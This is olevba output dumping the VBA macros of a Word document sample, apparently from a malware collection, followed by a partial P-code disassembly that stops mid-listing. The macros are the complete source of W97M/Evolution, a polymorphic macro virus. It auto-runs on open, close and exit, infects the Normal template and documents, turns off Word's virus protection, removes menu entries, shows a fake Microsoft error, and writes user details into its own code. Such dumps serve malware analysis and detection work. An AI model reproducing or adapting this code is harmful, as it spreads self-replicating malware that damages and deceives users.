olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Evolution.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Evolution.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LFGYAFNMUQMUMYJPUPAORTVFRRS.bas 
in file: ./Virus.MSWord.Evolution.c - OLE stream: 'Macros/VBA/LFGYAFNMUQMUMYJPUPAORTVFRRS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Source As String
 'Replication System
Public ByeMacro As String
 '
Public Hostinf As Boolean
Public FileInf As Boolean
 '
Public FExport As String
Public PMExport As String
 '
Public PMFile_Yes As Boolean
Public Ex_Yes As Boolean
 'Replication System
Public Filename As String
Public FileID As String
Public FileID2 As String
Public Virname As String
 'Replication System
Public FC_There As Boolean
 'Replication System
Public FO_There As Boolean
 '
Public FP_There As Boolean
Public FN_There As Boolean
 'RS
Public FS_There As Boolean
 '
Public FSA_There As Boolean
 '
Public VrusName As String
Public Armor As Boolean
Function Self_Recognition()
On Error Resume Next
 'RS
Application.EnableCancelKey = wdCancelDisabled
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
Do
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
 'RS
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
 '
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
 'RS
newname:
Close #1
 '
Open "C:\windows\system\vnames.cpl" For Append As #1
 'RS
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
 'Replication System
        End If
 'Replication System
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
 'Replication System
lost:
 'RS
Next Z
Loop Until EOF(1)
Close #1
Dim Lib
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
 '
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
 '
skip:
 'Replication System
Next Lib
 'RS
Loop Until EOF(1)
 'Replication System
doccheck:
Close #1
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
Do
Line Input #1, Virname
 '
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
 '
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
 'Replication System
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
 '
nope:
Next Lib
 '
Loop Until EOF(1)
 'RS
FileInf = False
leave:
 'Replication System
Close #1
 'Replication System
End Function
Function Armor_Status()
 'RS
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
 'RS
Offense:
 '
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
 '
End Function
Function Export_Code()
 '
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\export.sys")
 'RS
If FExport = "Export.sys" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
 'Replication System
Morph:
 'Replication System
Randomize Timer
 'RS
q = Int(Rnd(1) * 5) + 1
 '
For vi = 1 To q
x = Int(Rnd(1) * 26)
 'Replication System
If x = 1 Then a$ = "A"
 '
If x = 2 Then a$ = "B"
 'RS
If x = 3 Then a$ = "C"
 '
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
 'RS
If x = 7 Then a$ = "G"
 'RS
If x = 8 Then a$ = "H"
 'Replication System
If x = 9 Then a$ = "I"
 'RS
If x = 10 Then a$ = "J"
 '
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
 '
If x = 13 Then a$ = "M"
 'Replication System
If x = 14 Then a$ = "N"
 'RS
If x = 15 Then a$ = "O"
 'RS
If x = 16 Then a$ = "P"
 'RS
If x = 17 Then a$ = "Q"
 'RS
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
 'Replication System
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
 'Replication System
If x = 25 Then a$ = "Y"
 'RS
If x = 26 Then a$ = "Z"
 'RS
Filename = Filename + a$
 'Replication System
Next vi
x = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & x & ".cpl"
' RAPE v1.1 Export File ID Morph
 '
Open "C:\windows\system\Export.sys" For Append As #1
 'RS
Print #1, FileID
 '
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 'RS
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
 '
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
 'RS
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 '
Close #1
 'Replication System
nex:
 'Replication System
Next x
 '
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo nextt
Do
 '
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
 'RS
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
 'RS
nextt:
 '
Exit Function
 '
Recognize:
Open "C:\windows\system\Export.sys" For Input As #1
 '
Line Input #1, FileID
Close #1
 '
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
Do
On Error Resume Next
 'Replication System
Open "C:\windows\system\vnames.cpl" For Input As #1
 'RS
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
 'Replication System
tryharder:
 '
End Function
 'RS
Function Polymorphic_Check()
 'Replication System
On Error Resume Next
 'RS
Application.EnableCancelKey = wdCancelDisabled
Open FileID2 For Input As #1
Dim FC_Check
 'RS
Do
 '
    Line Input #1, FC_Check
 'RS
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
Dim FO_Check
Do
    Line Input #1, FO_Check
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
 'Replication System
Dim FP_Check
Do
    Line Input #1, FP_Check
 'Replication System
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
Loop Until EOF(1)
FN_Look:
Dim FN_Check
 'Replication System
Do
    Line Input #1, FN_Check
 'RS
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
 'RS
Loop Until EOF(1)
FS_Look:
Dim FS_Check
 'Replication System
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
 'Replication System
Loop Until EOF(1)
 'RS
FSA_Look:
Dim FSA_Check
Do
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
 'Replication System
Loop Until EOF(1)
 'RS
End Function
 '
Function Evolve()
 'Replication System
On Error Resume Next
 '
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
'RAPE v1.1 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
Open "C:\windows\system\Export.sys" For Input As #1
 'Replication System
Line Input #1, FileID2
 'RS
Close #1
 'Replication System
PM = Int(Rnd(1) * 150) + 1
 'Replication System
If PM = 22 Then
If FC_There = True Then Exit Function
 'RS
Open FileID2 For Append As #1
 'RS
Print #1, "Sub FileClose()"
Print #1, "On error resume next"
 '
Print #1, "Call Evolution"
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
End If
 'RS
If PM = 73 Then
 'RS
If FO_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
 'RS
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call Evolution"
 '
Print #1, "end sub"
Close #1
 '
End If
 '
If PM = 69 Then
If FP_There = True Then Exit Function
 'Replication System
Open FileID2 For Append As #1
Print #1, "Sub FilePrint()"
 '
Print #1, "on error resume next"
 '
Print #1, "Dialogs(wdDialogFilePrint)"
 '
Print #1, "Call Evolution"
 'RS
Print #1, "End sub"
 '
Close #1
 'Replication System
End If
 'Replication System
If PM = 122 Then
 '
If FN_There = True Then Exit Function
 'Replication System
Open FileID2 For Append As #1
 '
Print #1, "Sub FileNew()"
 'RS
Print #1, "on error resume next"
 '
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call Evolution"
Print #1, "End Sub"
 '
Close #1
 'Replication System
End If
 '
If PM = 90 Then
 'Replication System
If FS_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileSave()"
 '
Print #1, "on error resume next"
Print #1, "call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
 'Replication System
End If
If PM = 8 Then
If FSA_There = True Then Exit Function
 '
Open FileID2 For Append As #1
 'RS
Print #1, "Sub FileSaveAs()"
Print #1, "on error resume next"
 'Replication System
Print #1, "Dialogs(wdDialogFileSaveAs)"
Print #1, "Call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
End Function
 'RS
Function Norminf()
 'Replication System
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
 'Replication System
Line Input #1, FileID2
 'Replication System
Close #1
 '
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Replication System
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
 '
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
 '
        Open "C:\windows\system\vnames.cpl" For Append As #1
 '
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
 'Replication System
nexus:
 '
    Next l
 '
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
End With
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
End Function
 'RS
Function FileInft()
On Error Resume Next
 'Replication System
Application.EnableCancelKey = wdCancelDisabled
 '
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
 '
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
 'Replication System
End With
 'RS
Randomize Timer
 'RS
WD = Int(Rnd(1) * 8) + 2
 'RS
For evo = 2 To WD
 'RS
x = Int(Rnd(1) * 26)
 'RS
If x = 1 Then a$ = "A"
 'Replication System
If x = 2 Then a$ = "B"
 'RS
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
 'Replication System
If x = 5 Then a$ = "E"
 'Replication System
If x = 6 Then a$ = "F"
 '
If x = 7 Then a$ = "G"
 '
If x = 8 Then a$ = "H"
 '
If x = 9 Then a$ = "I"
 'RS
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
 'Replication System
If x = 12 Then a$ = "L"
 'Replication System
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
 'RS
If x = 15 Then a$ = "O"
 '
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
 'RS
If x = 18 Then a$ = "R"
 '
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
 'RS
If x = 22 Then a$ = "V"
 '
If x = 23 Then a$ = "W"
 'RS
If x = 24 Then a$ = "X"
 'Replication System
If x = 25 Then a$ = "Y"
 '
If x = 26 Then a$ = "Z"
 'Replication System
VrusName = VrusName + a$
Next evo
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 'Replication System
Do
 '
Line Input #1, Virname
 'RS
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
 'RS
' RAPE v1.1 Macro Virus Name Randomizer - 2 to 8 letters
Loop Until EOF(1)
 'RS
Close #1
 '
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 '
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
 'Replication System
Open "C:\windows\system\vnames.cpl" For Append As #1
 '
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 'Replication System
Close #1
nex:
Next x
 'Replication System
End Function
 'RS
Function Evolution()
On Error Resume Next
 'Replication System
Application.EnableCancelKey = wdCancelDisabled
Call Self_Recognition
 'Replication System
Call Armor_Status
 '
Call Export_Code
 'RS
Call Polymorphic_Check
Call Evolve
If Hostinf = False Then Call Norminf
If FileInf = False Then Call FileInft
 'Replication System
Options.VirusProtection = False
 'Replication System
Options.ConfirmConversions = False
 'RS
Options.SaveNormalPrompt = False
 'Replication System
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
' W97M/Evolution
' W97M/Evolution .a Variant by Nex and Error
' Polymorphic Stealth Word97 Macro Virus
' All Things Must Change...
 'RS
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error
 '
' RAPE v1.1 does:
' Randomly Morphs Source Code by Adding Random Remarks
 'RS
' Randomly Selects Source Code Export File - Then Morphs it
 '
' Randomly Creates Virus Macro Name
 '
' Randomly Adds 1 to 6 Commands to Code
End Function
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'RS
Call Evolution
 '
Wordbasic.FileSave
 'RS
End Sub
 'Replication System
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
Call Armor_Status
Options.VirusProtection = False
 'Replication System
Options.ConfirmConversions = False
 'RS
Options.SaveNormalPrompt = False
 'RS
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 'Replication System
End Sub
Sub AutoExit()
On Error Resume Next
 'Replication System
Application.EnableCancelKey = wdCancelDisabled
 'RS
Call Evolution
 '
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
 'Replication System
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
 '
If PMFile_Yes = True Then Exit Sub
 'Replication System
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
 '
Print #1, "W97M/Evolution .a by Nex"
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
 '
Close #1
Open "C:\windows\system\Export.sys" For Input As #2
 'Replication System
Line Input #2, FileID
 'Replication System
Close #2
 'RS
Open FileID For Append As #9
 'RS
Print #9, "' EOF"
Close #9
 '
Open FileID For Input As #3
Randomize Timer
W = Int(Rnd(1) * 5) + 1
For vir = 1 To W
x = Int(Rnd(1) * 26)
 'RS
If x = 1 Then a$ = "A"
 '
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
 'RS
If x = 6 Then a$ = "F"
 'RS
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
 '
If x = 10 Then a$ = "J"
 '
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
 'Replication System
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
 '
If x = 15 Then a$ = "O"
 '
If x = 16 Then a$ = "P"
 '
If x = 17 Then a$ = "Q"
 '
If x = 18 Then a$ = "R"
 '
If x = 19 Then a$ = "S"
 'RS
If x = 20 Then a$ = "T"
 'RS
If x = 21 Then a$ = "U"
 '
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
 'RS
If x = 24 Then a$ = "X"
 'RS
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
 '
Filename = Filename + a$
 '
Next vir
 'RS
F = Int(Rnd(1) * 999) + 1
 'Replication System
FileID2 = "C:\windows\system\" & Filename & F & ".cpl"
Open FileID2 For Append As #4
 'RS
Do
 'Replication System
inpux:
Line Input #3, stuff
 '
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
    If t = 1 Then Z$ = " '" & Application.UserName
    If t = 2 Then Z$ = " '" & Application.UserInitials
 'Replication System
    If t = 3 Then Z$ = " '" & Application.UserAddress
    If t >= 4 Then GoTo inpux
    Print #4, Z$
 '
' Source Code Morpher - adds random remarks to Code (RAPE v1.1 by Error)
 '
Loop Until stuff = "' EOF"
 'Replication System
Close #3
 'RS
Close #4
 '
Kill "C:\windows\system\export.sys"
Open "C:\windows\system\Export.sys" For Append As #5
 'RS
Print #5, FileID2
Close #5
 '
End Sub
Sub AutoNew()
 'Replication System
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
Sub AutoOpen()
On Error Resume Next
 'RS
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
Call Evolution
 'RS
End Sub
 'RS
Sub FileTemplates()
 'RS
Application.EnableCancelKey = wdCancelDisabled
 '
End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled
 'RS
End Sub
 'RS
Sub ToolsMacro()
 '
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
End Sub
Sub ViewVBCode()
 'RS
Application.EnableCancelKey = wdCancelDisabled
End Sub
 'RS
' "The most polymorphic Macro Virus to date...." - NAI
 '
' EOF

' EOF
' EOF
 'RS
Sub FileClose()
On Error Resume Next
Call Evolution
Wordbasic.FileSave
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Evolution.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/LFGYAFNMUQMUMYJPUPAORTVFRRS - 33456 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn Source (As String)
' Line #1:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #2:
' 	Dim (Public) 
' 	VarDefn ByeMacro (As String)
' Line #3:
' 	QuoteRem 0x0001 0x0000 ""
' Line #4:
' 	Dim (Public) 
' 	VarDefn Hostinf (As Boolean)
' Line #5:
' 	Dim (Public) 
' 	VarDefn FileInf (As Boolean)
' Line #6:
' 	QuoteRem 0x0001 0x0000 ""
' Line #7:
' 	Dim (Public) 
' 	VarDefn FExport (As String)
' Line #8:
' 	Dim (Public) 
' 	VarDefn PMExport (As String)
' Line #9:
' 	QuoteRem 0x0001 0x0000 ""
' Line #10:
' 	Dim (Public) 
' 	VarDefn PMFile_Yes (As Boolean)
' Line #11:
' 	Dim (Public) 
' 	VarDefn Ex_Yes (As Boolean)
' Line #12:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #13:
' 	Dim (Public) 
' 	VarDefn Filename (As String)
' Line #14:
' 	Dim (Public) 
' 	VarDefn FileID (As String)
' Line #15:
' 	Dim (Public) 
' 	VarDefn FileID2 (As String)
' Line #16:
' 	Dim (Public) 
' 	VarDefn Virname (As String)
' Line #17:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #18:
' 	Dim (Public) 
' 	VarDefn FC_There (As Boolean)
' Line #19:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #20:
' 	Dim (Public) 
' 	VarDefn FO_There (As Boolean)
' Line #21:
' 	QuoteRem 0x0001 0x0000 ""
' Line #22:
' 	Dim (Public) 
' 	VarDefn FP_There (As Boolean)
' Line #23:
' 	Dim (Public) 
' 	VarDefn FN_There (As Boolean)
' Line #24:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #25:
' 	Dim (Public) 
' 	VarDefn FS_There (As Boolean)
' Line #26:
' 	QuoteRem 0x0001 0x0000 ""
' Line #27:
' 	Dim (Public) 
' 	VarDefn FSA_There (As Boolean)
' Line #28:
' 	QuoteRem 0x0001 0x0000 ""
' Line #29:
' 	Dim (Public) 
' 	VarDefn VrusName (As String)
' Line #30:
' 	Dim (Public) 
' 	VarDefn Armor (As Boolean)
' Line #31:
' 	FuncDefn (Function Self_Recognition())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #34:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #35:
' 	QuoteRem 0x0001 0x0000 ""
' Line #36:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #37:
' 	QuoteRem 0x0001 0x0000 ""
' Line #38:
' 	Do 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #40:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #41:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #42:
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #43:
' 	QuoteRem 0x0001 0x0000 ""
' Line #44:
' 	Ld Virname 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lost 
' 	EndIf 
' Line #45:
' 	Ld Virname 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo newname 
' 	EndIf 
' Line #46:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #47:
' 	Label newname 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #49:
' 	QuoteRem 0x0001 0x0000 ""
' Line #50:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #51:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #54:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #57:
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lost 
' 	EndIf 
' Line #58:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #59:
' 	Label lost 
' Line #60:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #61:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #64:
' 	Dim 
' 	VarDefn Let
' Line #65:
' 	QuoteRem 0x0001 0x0000 ""
' Line #66:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #67:
' 	Do 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #69:
' 	QuoteRem 0x0001 0x0000 ""
' Line #70:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #71:
' 	Ld Let 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo skip 
' 	EndIf 
' Line #72:
' 	Ld Let 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Hostinf 
' 	BoS 0x0000 
' 	GoTo doccheck 
' 	EndIf 
' Line #73:
' 	QuoteRem 0x0001 0x0000 ""
' Line #74:
' 	Label skip 
' Line #75:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #76:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	NextVar 
' Line #77:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #78:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #79:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #80:
' 	Label doccheck 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #82:
' 	QuoteRem 0x0001 0x0000 ""
' Line #83:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #84:
' 	QuoteRem 0x0001 0x0000 ""
' Line #85:
' 	Do 
' Line #86:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #87:
' 	QuoteRem 0x0001 0x0000 ""
' Line #88:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #89:
' 	QuoteRem 0x0001 0x0000 ""
' Line #90:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nope 
' 	EndIf 
' Line #91:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FileInf 
' 	BoS 0x0000 
' 	GoTo leave 
' 	EndIf 
' Line #92:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #93:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St FileInf 
' 	BoS 0x0000 
' 	EndIf 
' Line #94:
' 	QuoteRem 0x0001 0x0000 ""
' Line #95:
' 	Label nope 
' Line #96:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	QuoteRem 0x0001 0x0000 ""
' Line #98:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #99:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #100:
' 	LitVarSpecial (False)
' 	St FileInf 
' Line #101:
' 	Label leave 
' Line #102:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #104:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #105:
' 	EndFunc 
' Line #106:
' 	FuncDefn (Function Armor_Status())
' Line #107:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #108:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #109:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Armor 
' 	EndIf 
' Line #110:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #111:
' 	Label Offense 
' Line #112:
' 	QuoteRem 0x0001 0x0000 ""
' Line #113:
' 	Ld Armor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #114:
' 	LitVarSpecial (False)
' 	St Armor 
' Line #115:
' 	QuoteRem 0x0001 0x0000 ""
' Line #116:
' 	EndFunc 
' Line #117:
' 	FuncDefn (Function Export_Code())
